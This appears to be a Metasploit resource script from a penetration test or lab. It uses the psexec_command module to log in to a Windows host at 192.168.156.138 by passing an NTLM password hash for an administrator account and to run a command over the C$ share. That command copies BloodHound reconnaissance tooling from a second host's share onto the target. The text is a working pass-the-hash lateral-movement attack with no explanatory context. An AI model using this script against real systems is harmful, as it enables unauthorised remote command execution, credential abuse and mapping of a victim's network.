use auxiliary/admin/smb/psexec_command
set SMBUser AdministradorPC
set SMBPass aad3b435b51404eeaad3b435b51404ee:adec0c3aeb06727b26cf55457cc399a3
set SMBSHARE C$
set RHOSTS 192.168.156.138
set command "xcopy \\\192.168.156.135\Bloodhound\*.* C:\BloodhoundClient"
run
